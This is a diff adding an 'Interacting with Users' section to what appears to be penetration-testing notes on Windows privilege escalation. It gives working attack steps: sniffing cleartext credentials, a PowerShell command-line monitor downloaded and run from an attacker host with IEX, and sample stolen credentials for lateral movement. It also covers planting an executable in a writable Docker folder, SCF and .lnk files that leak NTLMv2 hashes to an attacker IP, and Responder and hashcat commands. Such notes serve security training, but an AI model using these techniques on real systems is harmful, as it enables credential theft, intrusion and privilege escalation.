@@ -3467,6 +3467,119 @@ dir
 
 ---
 
+#  Interacting with Users 
+
+## 🔹 Traffic Capture
+
+If Wireshark/Npcap allows non-admin capture, sniff traffic for creds.
+
+**Useful tools:**
+
+* `Wireshark`
+* `tcpdump`
+* `net-creds`
+
+Example cleartext FTP creds that may appear:
+
+```
+USER root
+PASS FTP_adm1n!
+```
+
+
+## 🔹 Process Command Line Monitoring
+Some services or scheduled tasks accidentally place credentials in command arguments.
+Catch creds passed via command-line (scheduled tasks, scripts, services).
+
+**Monitor Script**
+
+```powershell
+while($true)
+{
+  $process = Get-WmiObject Win32_Process | Select-Object CommandLine
+  Start-Sleep 1
+  $process2 = Get-WmiObject Win32_Process | Select-Object CommandLine
+  Compare-Object -ReferenceObject $process -DifferenceObject $process2
+}
+```
+
+**Execute from attacker host**
+
+```powershell
+IEX (iwr 'http://10.10.10.205/procmon.ps1')
+```
+
+**Example captured creds**
+
+```
+net use T: \\sql02\backups /user:inlanefreight\sqlsvc My4dm1nP@s5w0Rd
+```
+Use this to:
+
+Access sensitive shares
+
+Move laterally
+
+Escalate privileges
+
+## 🔹 Vulnerable Services Example (Docker Desktop CE < 2.1.0.1)
+
+Misconfigured permissions in:
+
+```
+C:\ProgramData\DockerDesktop\version-bin\
+```
+
+Dropping an EXE here executes when:
+
+* Docker starts
+* User runs `docker login`
+
+
+## 🔹 SCF File (Triggers SMB Auth – NTLMv2 Hash Capture)
+
+(*Does NOT work on Server 2019*)
+
+**SCF File (`@Inventory.scf`)**
+
+```ini
+[Shell]
+Command=2
+IconFile=\\10.10.14.3\share\legit.ico
+[Taskbar]
+Command=ToggleDesktop
+```
+
+**Start Responder**
+
+```bash
+sudo responder -wrf -v -I tun0
+```
+
+**Crack captured hash**
+
+```bash
+hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt
+```
+
+## 🔹 Malicious .lnk File (Works on Server 2019+)
+
+**Generate .lnk**
+
+```powershell
+$objShell = New-Object -ComObject WScript.Shell
+$lnk = $objShell.CreateShortcut("C:\legit.lnk")
+$lnk.TargetPath = "\\<attackerIP>\@pwn.png"
+$lnk.WindowStyle = 1
+$lnk.IconLocation = "%windir%\system32\shell32.dll, 3"
+$lnk.Description = "Browsing triggers auth request."
+$lnk.HotKey = "Ctrl+Alt+O"
+$lnk.Save()
+```
+
+Place `.lnk` on a writable share → capture NTLMv2 via Responder/Inveigh.
+
+---
 
 # Pilaging in Windows 
 
